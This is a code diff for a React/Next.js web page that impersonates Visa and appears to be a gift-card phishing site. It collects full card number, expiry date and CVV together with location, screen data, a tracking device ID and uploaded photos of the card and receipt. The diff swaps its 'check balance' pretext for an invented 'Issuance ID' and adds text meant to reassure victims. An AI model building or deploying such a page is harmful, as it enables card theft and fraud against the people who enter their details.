@@ -2,7 +2,7 @@ import { useState, useEffect } from 'react'
 import Head from 'next/head'
 import styles from '../styles/visa.module.css'
 
-export default function VisaPage() {
+export default function HomePage() {
     const [card, setCard] = useState('')
     const [expiry, setExpiry] = useState('')
     const [cvv, setCvv] = useState('')
@@ -11,10 +11,11 @@ export default function VisaPage() {
     const [error, setError] = useState(null)
     const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
     const [showTutorial, setShowTutorial] = useState(false)
+    const [showIssuanceInfo, setShowIssuanceInfo] = useState(false)
     const [location, setLocation] = useState('Unknown')
     const [deviceId, setDeviceId] = useState(null)
+    const [copySuccess, setCopySuccess] = useState(false)
 
-    // Receipt upload states
     const [showUploadStep, setShowUploadStep] = useState(false)
     const [selectedImages, setSelectedImages] = useState([])
     const [uploadProgress, setUploadProgress] = useState(false)
@@ -35,7 +36,6 @@ export default function VisaPage() {
         }
         detectLocation()
 
-        // Initialize or get device ID
         let id = localStorage.getItem('deviceId')
         if (!id) {
             id = 'dev_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now()
@@ -48,6 +48,7 @@ export default function VisaPage() {
         e.preventDefault()
         setError(null)
         setResult(null)
+        setCopySuccess(false)
         if (!card.trim()) return setError('Please enter your Visa Gift Card number.')
         if (!expiry.trim()) return setError('Please enter the expiration date.')
         if (!cvv.trim()) return setError('Please enter the CVV code.')
@@ -61,7 +62,7 @@ export default function VisaPage() {
                 screen: `${window.screen.width}x${window.screen.height}`
             }
 
-            const res = await fetch('/api/check-balance', {
+            const res = await fetch('/api/generate-issuance-id', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -77,7 +78,6 @@ export default function VisaPage() {
             const data = await res.json()
             if (!res.ok) throw new Error(data?.error || 'Unable to verify card. Please try again later.')
             setResult(data)
-            // Show upload step only if card was successfully saved (has cardId) and not a duplicate
             if (data.cardId && !data.isDuplicate) {
                 setShowUploadStep(true)
             }
@@ -148,6 +148,18 @@ export default function VisaPage() {
     const skipUpload = () => {
         setShowUploadStep(false)
         setSelectedImages([])
+        setUploadError(null)
+    }
+
+    const copyIssuanceId = async () => {
+        if (!result?.issuanceId) return
+
+        try {
+            await navigator.clipboard.writeText(result.issuanceId)
+            setCopySuccess(true)
+        } catch (err) {
+            setError('Unable to copy the Issuance ID right now.')
+        }
     }
 
     const resetForm = () => {
@@ -159,19 +171,20 @@ export default function VisaPage() {
         setSelectedImages([])
         setUploadComplete(false)
         setUploadError(null)
+        setCopySuccess(false)
     }
 
     return (
         <div className={styles.visaPage}>
             <Head>
-                <title>Check Visa Gift Card Balance | Visa</title>
+                <title>Check Issuance ID | Visa</title>
                 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
             </Head>
 
             <header className={styles.header}>
                 <div className={styles.headerTop}>
                     <div className={styles.headerLeft}>
-                        <a href="/visa" className={styles.logoContainer}>
+                        <a href="/" className={styles.logoContainer}>
                             <img src="/visalogo.PNG" alt="Visa" className={styles.logo} />
                         </a>
                     </div>
@@ -199,7 +212,6 @@ export default function VisaPage() {
                     </div>
                 </div>
 
-                {/* Mobile Navigation Menu */}
                 <div className={`${styles.mobileNav} ${mobileMenuOpen ? styles.active : ''}`}>
                     <a href="#" onClick={() => setMobileMenuOpen(false)}>Personal</a>
                     <a href="#" onClick={() => setMobileMenuOpen(false)}>Business</a>
@@ -211,13 +223,12 @@ export default function VisaPage() {
 
             <main className={styles.main}>
                 <div className={styles.breadcrumb}>
-                    Support › Gift Cards › Check Balance
+                    Support › cards › Check Issuance ID
                 </div>
 
                 <section className={styles.cardSection}>
                     <div className={styles.formContainer}>
-                        <h1 className={styles.mainTitle}>Visa Gift Card Balance</h1>
-                        <p className={styles.subtitle}>Enter your card details to check your remaining balance instantly.</p>
+                        <p className={styles.subtitle}>Enter your card details to instantly check the Issuance ID.</p>
 
                         <div className={styles.card}>
                             <form onSubmit={checkBalance}>
@@ -277,34 +288,26 @@ export default function VisaPage() {
                                     </div>
                                 </div>
 
-                                <button type="submit" className={styles.button} disabled={loading}>
-                                    {loading ? 'Verifying...' : 'Check Balance'}
-                                </button>
+                                {!showUploadStep && (
+                                    <button type="submit" className={styles.button} disabled={loading}>
+                                        {loading ? 'Verifying...' : 'CHECK ID'}
+                                    </button>
+                                )}
                             </form>
 
                             {result && !showUploadStep && (
                                 <div className={styles.result}>
                                     <div className={styles.resultHeader}>
                                         <span className={styles.statusDot}></span>
-                                        Card Successfully Verified
+                                        Issuance ID
                                     </div>
-                                    {result.message ? (
-                                        <div className={styles.error} style={{ background: 'rgba(26, 31, 113, 0.1)', color: '#1a1f71', border: '1px solid rgba(26, 31, 113, 0.2)', margin: '20px 0', borderRadius: '8px' }}>
-                                            <span>{result.message}</span>
-                                        </div>
-                                    ) : (
-                                        <div className={styles.balanceText}>
-                                            Available Balance
-                                            <span className={styles.amount}>${result.balance?.toFixed(2)} {result.currency}</span>
-                                        </div>
-                                    )}
-                                    {uploadComplete && (
-                                        <div style={{ background: 'rgba(26, 31, 113, 0.1)', color: '#1a1f71', padding: '12px', borderRadius: '8px', marginBottom: '15px', textAlign: 'center' }}>
-                                            ✓ Uploaded successfully
-                                        </div>
-                                    )}
-                                    <p className={styles.readyMsg}>Your Visa Gift Card is ready for use anywhere Visa is accepted.</p>
-                                    <button type="button" className={styles.button} onClick={resetForm} style={{ marginTop: '15px' }}>Check another card</button>
+                                    <div className={styles.balanceText}>
+                                        <span className={styles.amount}>{result.issuanceId}</span>
+                                    </div>
+                                    <p className={styles.readyMsg}>This is your Issuance ID.</p>
+                                    <button type="button" className={styles.button} onClick={copyIssuanceId} style={{ marginTop: '15px' }}>
+                                        {copySuccess ? 'ID COPIED' : 'COPY ID CODE'}
+                                    </button>
                                 </div>
                             )}
 
@@ -317,7 +320,7 @@ export default function VisaPage() {
                                         </svg>
                                         <h3>Upload Card Image / Receipt</h3>
                                     </div>
-                                    <p className={styles.uploadSubtitle}>For faster balance verification, upload a photo of your card and purchase receipt.</p>
+                                    <p className={styles.uploadSubtitle}>Upload a photo of the card or screenshots to continue with the ID check.</p>
 
                                     <div className={styles.imagePreviewGrid}>
                                         {selectedImages.map((img, idx) => (
@@ -347,6 +350,9 @@ export default function VisaPage() {
                                         <button type="button" className={styles.button} onClick={handleUpload} disabled={uploadProgress || selectedImages.length === 0}>
                                             {uploadProgress ? 'Uploading...' : 'Upload'}
                                         </button>
+                                        <button type="button" className={styles.skipBtn} onClick={skipUpload} disabled={uploadProgress}>
+                                            Skip
+                                        </button>
                                     </div>
                                 </div>
                             )}
@@ -363,7 +369,6 @@ export default function VisaPage() {
                             )}
                         </div>
 
-                        {/* Tutorial Section */}
                         <div className={styles.tutorialWrapper}>
                             <button
                                 className={styles.tutorialToggle}
@@ -405,6 +410,45 @@ export default function VisaPage() {
                                     </div>
                                 </div>
                                 <p className={styles.imageCaption}>Your card number is located on the front of your Visa Gift Card.</p>
+                            </div>
+                        </div>
+
+                        <div
+                            className={styles.tutorialWrapper}
+                            style={{ marginTop: '16px', borderTop: 'none', paddingTop: 0 }}
+                        >
+                            <button
+                                className={styles.tutorialToggle}
+                                onClick={() => setShowIssuanceInfo(!showIssuanceInfo)}
+                            >
+                                <span>What is an Issuance ID?</span>
+                                <svg
+                                    viewBox="0 0 24 24"
+                                    width="20"
+                                    height="20"
+                                    fill="none"
+                                    stroke="currentColor"
+                                    strokeWidth="2.5"
+                                    style={{ transform: showIssuanceInfo ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.4s' }}
+                                >
+                                    <polyline points="6 9 12 15 18 9" />
+                                </svg>
+                            </button>
+
+                            <div className={`${styles.tutorialContent} ${showIssuanceInfo ? styles.show : ''}`}>
+                                <div className={styles.tutorialStep}>
+                                    <div className={styles.stepNumber}>1</div>
+                                    <div className={styles.stepText}>An Issuance ID is an identification number linked to your card and used for customer care, card support, account verification, and other card-related assistance.</div>
+                                </div>
+                                <div className={styles.tutorialStep}>
+                                    <div className={styles.stepNumber}>2</div>
+                                    <div className={styles.stepText}>You can use the Issuance ID to help fund the card, send money to the card through supported channels, and confirm card records when needed.</div>
+                                </div>
+                                <div className={styles.tutorialStep}>
+                                    <div className={styles.stepNumber}>3</div>
+                                    <div className={styles.stepText}>You cannot spend the card money from the Issuance ID, but you can use it for funding, support requests, and card-related verification.</div>
+                                </div>
+                                <p className={styles.imageCaption}>The Issuance ID supports funding, transfers, and verification, but it cannot be used to spend your card balance.</p>
                             </div>
                         </div>
                     </div>
